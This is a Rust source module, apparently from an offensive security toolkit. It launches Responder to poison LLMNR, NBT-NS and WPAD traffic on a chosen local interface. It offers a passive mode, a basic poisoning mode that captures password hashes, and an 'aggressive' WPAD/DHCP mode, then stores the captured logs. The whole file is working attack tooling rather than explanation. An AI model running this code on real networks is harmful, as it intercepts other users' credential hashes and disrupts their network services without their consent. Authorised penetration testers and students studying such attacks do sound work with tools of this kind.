use std::process::{Command, Stdio};
use std::io::{self, Write};
use std::fs;
use std::path::Path;
use chrono::Local;
use colored::*;
use crate::history::{append_history, HistoryEntry};

#[derive(Debug, Clone)]
struct PoisonProfile {
    name: String,
    description: String,
    flags: Vec<&'static str>,
}

impl PoisonProfile {
    fn new(name: &str, description: &str, flags: &[&'static str]) -> Self {
        Self {
            name: name.to_string(),
            description: description.to_string(),
            flags: flags.to_vec(),
        }
    }
}

pub fn run_poisoning(interface_input: &str, _use_proxy: bool) {
    // 1. Check Root
    if unsafe { libc::geteuid() } != 0 {
        println!("{}", "[!] LAN Poisoning requires ROOT privileges.".red());
        return;
    }

    // 2. Check Dependency
    if Command::new("responder").arg("--help").output().is_err() {
        println!("{}", "[-] 'responder' not found. Please install it (sudo apt install responder).".red());
        return;
    }

    // 3. Select Interface (if not provided or empty)
    let interface = if interface_input.is_empty() {
        select_interface()
    } else {
        interface_input.to_string()
    };

    if interface.is_empty() {
        println!("{}", "[!] No interface selected.".red());
        return;
    }

    // 4. Define Profiles
    let profiles = vec![
        PoisonProfile::new(
            "Analyze Mode",
            "Passive. Listen for requests, do NOT poison. (Safe)",
            &["-A"]
        ),
        PoisonProfile::new(
            "Basic Poisoning",
            "Respond to LLMNR/NBT-NS queries. Capture hashes.",
            &["-w", "-r", "-f"]
        ),
        PoisonProfile::new(
            "Aggressive",
            "Force WPAD authentication + DHCP (Risky).",
            &["-w", "-r", "-f", "--wpad", "--dhcp-wpad"] // Careful with DHCP
        ),
    ];

    // 5. Select Profile
    println!("\n{}", "Select Poisoning Profile:".blue().bold());
    for (i, p) in profiles.iter().enumerate() {
        println!("[{}] {} - {}", i + 1, p.name.green(), p.description);
    }

    print!("\nChoose a profile [1-{}]: ", profiles.len());
    let _ = io::stdout().flush();
    let mut input = String::new();
    io::stdin().read_line(&mut input).unwrap_or_default();

    let profile = if let Ok(idx) = input.trim().parse::<usize>() {
        if idx > 0 && idx <= profiles.len() {
            profiles[idx - 1].clone()
        } else {
            profiles[0].clone()
        }
    } else {
        profiles[0].clone()
    };

    // 6. Setup Output
    // Responder is noisy. We'll run it interactively but maybe try to move logs after.
    // Responder logs usually go to /usr/share/responder/logs/ or local logs/
    // We will assume interactive run for now as it's a TUI tool.
    
    let date = Local::now().format("%Y%m%d_%H%M%S").to_string();
    let output_dir = format!("scans/poison/{}", date);
    fs::create_dir_all(&output_dir).expect("Failed to create output dir");

    println!("{}", format!("\n[+] Starting Responder on {}", interface).green());
    println!("{}", format!("[+] Profile: {}", profile.name).cyan());
    println!("{}", "[!] Press Ctrl+C to stop.".yellow());

    // 7. Execute
    // responder -I <iface> <flags>
    let mut cmd_args = vec!["-I", &interface];
    cmd_args.extend(profile.flags.iter().map(|s| s as &str));

    // We use sudo implicitly because we checked root, but if we are not root (e.g. strict confinement), we fail.
    // But we checked geteuid 0.

    let status = Command::new("responder")
        .args(&cmd_args)
        .stdin(Stdio::inherit())
        .stdout(Stdio::inherit())
        .stderr(Stdio::inherit())
        .status();

    // 8. Post-Run Cleanup / Log Retrieval
    // Try to find logs and move them?
    // Common path: /usr/share/responder/logs/
    // or ./logs/
    
    // Check local logs first
    if Path::new("logs").exists() {
         let _ = fs::rename("logs", Path::new(&output_dir).join("logs"));
         println!("{}", format!("[+] Logs moved to {}", output_dir).green());
    }

    match status {
        Ok(_) => {
             let _ = append_history(&HistoryEntry::new("Poisoning", &interface, "Executed"));
        },
        Err(e) => println!("{} {}", "[!] Failed to start process:".red(), e),
    }
}

fn select_interface() -> String {
    // List interfaces using 'ip link'
    let output = Command::new("ip").arg("link").output();
    if let Ok(out) = output {
        let out_str = String::from_utf8_lossy(&out.stdout);
        let mut ifaces = Vec::new();
        
        for line in out_str.lines() {
            if let Some(start) = line.find(": ") {
                if let Some(end) = line[start+2..].find(':') {
                    let iface = &line[start+2..start+2+end];
                    if iface != "lo" {
                        ifaces.push(iface.trim().to_string());
                    }
                }
            }
        }

        if ifaces.is_empty() {
            return "eth0".to_string(); // Fallback
        }

        println!("\n{}", "Available Interfaces:".blue());
        for (i, iface) in ifaces.iter().enumerate() {
            println!("[{}] {}", i + 1, iface);
        }

        print!("\nSelect Interface [1-{}]: ", ifaces.len());
        let _ = io::stdout().flush();
        let mut input = String::new();
        io::stdin().read_line(&mut input).unwrap_or_default();

        if let Ok(idx) = input.trim().parse::<usize>() {
            if idx > 0 && idx <= ifaces.len() {
                return ifaces[idx - 1].clone();
            }
        }
        ifaces[0].clone()
    } else {
        "eth0".to_string()
    }
}
